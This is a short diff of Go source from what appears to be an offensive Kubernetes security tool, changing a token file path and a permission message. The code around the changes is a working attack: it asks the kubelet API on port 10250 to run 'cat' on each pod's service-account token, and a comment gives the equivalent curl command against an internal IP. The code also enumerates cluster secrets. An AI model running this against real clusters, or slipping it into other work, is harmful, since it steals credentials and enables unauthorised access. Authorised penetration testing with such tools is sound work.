@@ -74,7 +74,7 @@ func getPodList(connectionString ServerInfo) []string {
 func getSecretList(connectionString ServerInfo) ([]string, []string) {
 
 	if !kubectlAuthCanI(connectionString, "get", "secrets") {
-		println("[-] Permission Denied: your service account isn't allowed to get secrets")
+		println("[-] Permission Denied: your service account isn't allowed to list secrets")
 		return []string{}, []string{}
 	}
 
@@ -905,10 +905,10 @@ func ExecuteCodeOnKubelet(connectionString ServerInfo, ServiceAccounts *[]Servic
 								}
 								sslClient := &http.Client{Transport: tr}
 
-								// curl -sk https://10.23.58.41:10250/run/" + podNamespace + "/" + podName + "/" + containerName + "/ -d \"cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token\""
+								// curl -sk https://10.23.58.41:10250/run/" + podNamespace + "/" + podName + "/" + containerName + "/ -d \"cmd=cat /run/secrets/kubernetes.io/serviceaccount/token\""
 
 								data := url.Values{}
-								data.Set("cmd", "cat /var/run/secrets/kubernetes.io/serviceaccount/token")
+								data.Set("cmd", "cat /run/secrets/kubernetes.io/serviceaccount/token")
 								// data.Set("cmd", "hostname")
 
 								urlExecPod := "https://" + addr.Address + ":10250/run/" + podNamespace + "/" + podName + "/" + containerName + "/"
